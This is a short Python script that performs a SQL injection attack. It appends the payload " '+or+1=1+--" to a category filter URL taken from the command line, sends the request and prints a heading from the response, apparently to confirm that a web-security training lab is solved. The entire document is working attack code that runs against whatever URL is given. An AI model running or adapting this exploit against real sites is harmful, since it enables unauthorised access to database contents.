import requests
import sys
from bs4 import BeautifulSoup

url=sys.argv[1]
print(url)


payload = " '+or+1=1+--"

endpoint="/filter?category=Gifts"

final_url=f"{url}{endpoint}{payload}"
print(final_url)
res=requests.get(final_url)
soup=BeautifulSoup(res.text, 'html.parser')
completed =soup.find('h4').text
print(completed)
